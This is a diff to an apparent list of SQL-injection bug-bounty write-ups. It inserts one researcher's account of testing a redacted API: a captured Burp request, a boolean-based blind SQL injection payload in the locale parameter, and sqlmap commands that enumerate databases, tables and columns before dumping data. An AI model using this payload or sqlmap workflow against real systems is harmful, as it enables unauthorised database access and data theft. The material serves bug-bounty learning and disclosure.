@@ -744,6 +744,31 @@ Conclusion:
 - [Exploiting tricky blind SQLI](https://www.noob.ninja/2019/07/exploiting-tricky-blind-sql-injection.html)
 - [SQLI in forget password fucntion](https://medium.com/@kgaber99/sql-injection-in-forget-password-function-3c945512e3cb)
 - [SQLI Bug Bounty](https://medium.com/@ariffadhlullah2310/sql-injection-bug-bounty-110e92e71ec3)
+
+  The scope is : *.xxxx.com
+  I found the vulnerability is on api.xxx.com
+  This is the raw that i got on burp
+ 
+  GET /api/trend/get?locale=en_GB&device=desktop&uiv=4 HTTP/1.1
+  Host: api.xxxx.com
+  Content-Type: application/x-www-form-urlencoded
+  Origin: https://www.xxx.com
+  Connection: close
+  blablabla
+ 
+  This is my payload : locale=en_GB’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END)) — BWMI&device=desktop&uiv=4
+  
+  1. i save the raw into the notepad as .txt format
+  2. i run my sqlmap from my terminal (because i used mac. i use this only sqlmap -r /xxx/xxx/xxx/files.txt — dbs
+  3. i got something cool stuff there i got the database
+  4. and i try to get more than the dbs. i try to check the table first using this sqlmap -r /xxx/xxx/xxx/files.txt -D xxx — table
+  5. i found a lot of table there but there is something interesting for me. Then i try to get the columns
+  6. sqlmap -r /xxx/xxx/xxx/files.txt -D xxx -T xxx — columns
+  7. i got the columns. very interesting then i try to got the field of DB
+  8. TADAAAA i GOT what i want .
+  
+  ![sqlibugbounty](https://miro.medium.com/max/3000/1*45135uLkqPC6aeSwjQN34Q.png)
+
 - [File Upload blind SQLI](https://jspin.re/fileupload-blind-sqli/)
 - [SQL Injection](https://medium.com/@saadahmedx/sql-injection-c87a390afdd3)
 - [SQLI through User Agent](https://medium.com/@frostnull1337/sql-injection-through-user-agent-44a1150f6888)
